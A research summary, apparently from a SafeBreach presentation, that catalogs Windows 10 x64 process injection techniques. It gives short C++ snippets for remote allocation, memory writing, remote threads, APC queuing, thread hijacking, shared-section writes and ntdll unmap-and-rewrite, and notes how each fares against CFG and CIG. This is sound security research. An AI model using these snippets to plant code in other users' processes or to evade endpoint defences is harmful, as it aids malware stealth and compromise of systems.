# Process Injection Techniques: A Comprehensive Analysis

## Authors
- **Amit Klein**
  - VP of Security Research at SafeBreach (2015-Present)
  - Over 28 years in Information Security
  - Author of 30+ research papers and numerous advisories on high-profile products
  - Presented at BlackHat, DefCon, HITB, NDSS, InfoCom, DSN, RSA, CertConf, Bluehat, OWASP Global, OWASP EU, AusCERT, and more
  - [Personal Website](http://www.securitygalore.com)

- **Itzik Kotler**
  - CTO and Co-Founder of SafeBreach
  - Over 15 years in Information Security
  - Presented at Black Hat, DEF CON, HITB, RSA, CCC, and more
  - [Personal Website](http://www.ikotler.org)

## Why This Research?
- **Lack of Comprehensive Collection**: There is no comprehensive catalog of process injection techniques.
- **True Injections vs. Hollowing/Spawning**: No clear separation between true process injections and process hollowing/spawning.
- **Categorization and Analysis**: No categorization (e.g., allocation, memory write, execution), analysis, or comparison of techniques.
- **Windows 10 Update**: Need for an update to cover the latest versions of Windows 10 and x64 architecture.

## Acknowledgments
- Special thanks to:
  - Adam of Hexacorn
  - Odzhan
  - EnSilo
  - Csaba Fitzl (AKA TheEvilBit)
  - And many others
- Hat tip to EndGame for providing the first compilation of injection techniques.

## True Process Injection
- **Definition**: True process injection involves injecting code from a live user-space process (malware) into another live user-space process (target, benign).
- **Out of Scope**:
  - **Process Spawning and Hollowing**: Spawning the target process and injecting into it, especially before execution.
  - **Pre-execution Techniques**: DLL hijacking, AppCert, AppInit, LSP providers, Image File Execution Options, etc.

## Windows 10, x64
- **Windows 10**:
  - **CFG (Control Flow Guard)**: Prevents indirect calls to non-approved addresses.
  - **CIG (Code Integrity Guard)**: Only allows modules signed by Microsoft, Microsoft Store, or WHQL to be loaded into process memory.
- **x64 Architecture**:
  - **Calling Convention**: The first 4 arguments are passed in volatile registers (RCX, RDX, R8, R9). Invoking functions via ROP requires control over these registers.
  - **No POPA**: Writing ROP chains is more difficult due to the lack of POPA (bootstrapping registers).

## Scope
- **True Process Injection**: Running a sequence of logic/commands in the target process.
- **Target Environment**: Windows 10 version 1803 and above, x64 injecting process, x64 target process, both at medium integrity, non-admin.
- **Evaluation**: Against Windows 10 protections (CFG, CIG).

## CFG Strategy
- **Disable CFG**: Use `SetProcessValidCallTargets()` to deactivate CFG in the target process.
- **Allocate/Set Executable Memory**: Use `VirtualAllocEx`/`VirtualProtectEx`.
- **Play by the Rules**: Write non-executable data (ROP chain) and use a CFG-agnostic execution method to run a stack pivot gadget.

## Other Defenses
- **SetProcessMitigationPolicy**: Used to eliminate defenses from the target process, but no longer works in version 1809.
- **CIG Impact**: Most restrictive, as it prevents loading of arbitrary DLLs.

## Typical Process Injection Building Blocks
- **Memory Allocation**: May be implicit (cave, stack, etc.). Consider page permissions, allocation address, and CFG validity.
- **Memory Writing**: Check for restricted size/charset, atomicity, and CFG validity.
- **Execution**: Ensure the target is CFG-valid and consider register control.

## Process Injection Techniques
### Classic Memory Allocation
```cpp
HANDLE h = OpenProcess(PROCESS_VM_OPERATION, FALSE, process_id);
LPVOID target_payload = VirtualAllocEx(h, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```
- **Notes**: Can allocate executable pages, which Windows automatically sets to be CFG-valid.

### WriteProcessMemory
```cpp
HANDLE h = OpenProcess(PROCESS_VM_WRITE, FALSE, process_id);
WriteProcessMemory(h, target_payload, payload, sizeof(payload), NULL);
```
- **Notes**: No prerequisites, no limitations. Address is controlled. If the allocation set execution privileges, all regions are CFG-valid.

### CreateRemoteThread
```cpp
HANDLE h = OpenProcess(PROCESS_CREATE_THREAD, FALSE, process_id);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)target_execution, RCX, 0, NULL);
```
- **Notes**: No prerequisites. Target execution should be a valid CFG target. Control over RCX.

### DLL Injection
```cpp
HANDLE h = OpenProcess(PROCESS_CREATE_THREAD, FALSE, process_id);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, target_DLL_path, 0, NULL);
```
- **Notes**: Requires the DLL to be on disk and the path written to the target process. CIG blocks this technique.

### SetWindowsHookEx
```cpp
HMODULE h = LoadLibraryA(dll_path);
HOOKPROC f = (HOOKPROC)GetProcAddress(h, "GetMsgProc");
SetWindowsHookExA(WH_GETMESSAGE, f, h, thread_id);
PostThreadMessage(thread_id, WM_NULL, NULL, NULL);
```
- **Notes**: Requires the DLL to be on disk and export the required function. CIG blocks this technique.

### APC Execution
```cpp
HANDLE h = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
QueueUserAPC((LPTHREAD_START_ROUTINE)target_execution, h, RCX);
```
- **Notes**: Thread must be in an alertable state. Target execution should be a valid CFG target. Control over RCX.

### Thread Hijacking (SIR)
```cpp
HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
SuspendThread(t);
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
ctx.Rip = (DWORD64)target_execution;
SetThreadContext(t, &ctx);
ResumeThread(t);
```
- **Notes**: No prerequisites. Limited control over volatile registers. Control over RSP is limited.

### Ghost-Writing
- **Description**: Like thread hijacking, but without the memory writing part. Uses `SetThreadContext` to set registers.
- **Steps**:
  1. Write a loop gadget into the stack.
  2. Write arbitrary memory using the write gadget.
  3. Execute a stack pivot.

### Shared Memory Writing
```cpp
HANDLE hm = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, section_name);
BYTE* buf = (BYTE*)MapViewOfFile(hm, FILE_MAP_ALL_ACCESS, 0, 0, section_size);
memcpy(buf + section_size - sizeof(payload), payload, sizeof(payload));
```
- **Notes**: Requires writable memory. No impact from CFG or CIG.

### Unmap+Rewrite
```cpp
MODULEINFO ntdll_info;
HMODULE ntdll = GetModuleHandleA("ntdll");
GetModuleInformation(GetCurrentProcess(), ntdll, &ntdll_info, sizeof(ntdll_info));
LPVOID ntdll_copy = malloc(ntdll_info.SizeOfImage);
HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_SUSPEND_RESUME, FALSE, process_id);
NtSuspendProcess(p);
ReadProcessMemory(p, ntdll, ntdll_copy, ntdll_info.SizeOfImage, NULL);
// Patch e.g. NtClose in ntdll_copy
NtUnmapViewOfSection(p, ntdll);
// Allocate +(Re)write ntdll_copy to address ntdll in target process
FlushInstructionCache(p, ntdll, ntdll_info.SizeOfImage);
NtResumeProcess(p);
```
- **Notes**: Requires the ability to allocate RX pages in a specific address. No impact from CIG.

This document provides a detailed and structured overview of various process injection techniques, their implementation, and the challenges they face in the context of modern Windows 10 and x64 architectures.